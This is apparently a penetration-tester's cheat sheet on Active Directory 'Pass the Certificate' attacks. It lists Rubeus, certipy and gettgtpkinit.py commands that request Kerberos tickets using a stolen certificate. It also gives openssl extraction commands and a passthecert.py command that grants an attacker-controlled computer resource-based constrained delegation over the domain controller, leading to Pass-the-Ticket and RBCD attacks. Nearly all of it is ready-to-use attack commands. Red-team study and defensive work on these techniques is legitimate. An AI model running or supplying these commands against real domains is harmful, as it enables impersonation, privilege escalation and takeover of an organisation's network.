# Pass the Certificate

## Tools: gettgtpkinit.py , Rubeus , certipy

# PKINIT

#### 1) Rubeus

 - Rubeus.exe asktgt /user:"USERNAME" /certificate:"PFX_FILE" [/password:"CERTIFICATE_PASSWORD] /domain:"FQDN_DOMAIN" /dc:"DC" /show

#### 2) certipy

 - certipy auth -pfx CRT_FILE -dc-ip DC_IP

#### 3) gettgtpkinit.py

 - gettgtpkinit.py -cert-pfx "PFX_FILE" [cert-pfx-pass "CERT_PASSWORD"] "FQDN_DOMAIN/USER "TGT_CCACHE_FILE"

### These 3 techniques can be performed for a Pass-the-Ticket attack

# Schannel (Secure Channel)

#### 1) certipy

 - certipy auth -pfx CRT_FILE -ldap-shell

 - add_computer

 - set_rbcd

#### 2) PassTheCert.py https://github.com/AlmondOffSec/PassTheCert.git

### Extract the .key and .crt files from the .pfx file

 - openssl pkcs12 -in USER_CERT.pfx -nocerts -out USER.key (Extract the .key file. Leave import password blank and put something like 1234 for PEM pass.)

 - openssl pkcs12 -in USER_CERT.pfx -clcerts -nokeys -out USER.crt (Extract the .crt file)

 - python3 passthecert.py -dc-ip DC_IP -crt USER.crt -key USER.key -domain DOMAIN.LOCAL -port 636 -action write_rbcd -delegate-to 'DOMAIN$' -delegate-from 'OUR_COMP$' (Authenticate against LDAPS using Schannel. In this example, we give the computer account we control RBCD, AKA delegation rights over the DC. Enter the PEM phrase we used when extracting the .key file earlier)

### With this technique, we can now perform an RBCD attack
